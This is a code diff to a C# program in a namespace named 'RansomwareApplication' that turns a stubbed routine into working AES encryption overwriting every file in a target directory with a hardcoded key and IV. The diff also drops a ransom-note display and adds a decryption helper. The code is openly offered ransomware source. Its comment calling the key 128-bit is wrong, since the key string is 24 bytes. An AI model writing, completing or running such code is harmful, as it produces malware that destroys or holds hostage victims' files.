@@ -1,5 +1,7 @@
 ﻿using System;
 using System.IO;
+using System.Security.Cryptography;
+using System.Text;
 
 namespace RansomwareApplication
 {
@@ -9,13 +11,12 @@ namespace RansomwareApplication
 
     class Program
     {
+        private static string key = "abcdefghijklmnopqrstuvwx"; // 128-bit key
+        private static string iv = "1234567890123456"; // 128-bit IV
         static void Main(string[] args)
         {
-            string targetDirectory = @"C:\Users\TargetUser\Documents";
-            string ransomNote = "Your files have been encrypted. Pay the ransom to get the decryption key.";
-
+            string targetDirectory = @"D:\Document";
             EncryptFiles(targetDirectory);
-            DisplayRansomNote(ransomNote);
         }
 
         static void EncryptFiles(string directory)
@@ -24,20 +25,56 @@ namespace RansomwareApplication
 
             foreach (string file in files)
             {
-                byte[] encryptedData = EncryptData(File.ReadAllBytes(file));
-                File.WriteAllBytes(file, encryptedData);
+                string fileName = Path.GetFileName(file);
+                byte[] data = File.ReadAllBytes(file);
+                byte[] encrypt = EncryptData(data);
+                File.WriteAllBytes(file, encrypt);
+                //byte[] decrypt = Decrypt(data);
+                //File.WriteAllBytes(file, decrypt);
             }
         }
 
         static byte[] EncryptData(byte[] data)
         {
-            // Encryption logic goes here
-            return data;
-        }
+            using (Aes aesAlg = Aes.Create())
+            {
+                aesAlg.Key = Encoding.UTF8.GetBytes(key);
+                aesAlg.IV = Encoding.UTF8.GetBytes(iv);
 
-        static void DisplayRansomNote(string note)
+                ICryptoTransform encryptor = aesAlg.CreateEncryptor(aesAlg.Key, aesAlg.IV);
+
+                using (MemoryStream msEncrypt = new MemoryStream())
+                {
+                    using (CryptoStream csEncrypt = new CryptoStream(msEncrypt, encryptor, CryptoStreamMode.Write))
+                    {
+                        csEncrypt.Write(data, 0, data.Length);
+                        csEncrypt.FlushFinalBlock();
+                    }
+                    return msEncrypt.ToArray();
+                }
+            }
+        }
+        public static byte[] Decrypt(byte[] encryptedData)
         {
-            Console.WriteLine(note);
+            using (Aes aesAlg = Aes.Create())
+            {
+                aesAlg.Key = Encoding.UTF8.GetBytes(key);
+                aesAlg.IV = Encoding.UTF8.GetBytes(iv);
+
+                ICryptoTransform decryptor = aesAlg.CreateDecryptor(aesAlg.Key, aesAlg.IV);
+
+                using (MemoryStream msDecrypt = new MemoryStream(encryptedData))
+                {
+                    using (CryptoStream csDecrypt = new CryptoStream(msDecrypt, decryptor, CryptoStreamMode.Read))
+                    {
+                        using (MemoryStream msOutput = new MemoryStream())
+                        {
+                            csDecrypt.CopyTo(msOutput);
+                            return msOutput.ToArray();
+                        }
+                    }
+                }
+            }
         }
     }
 }
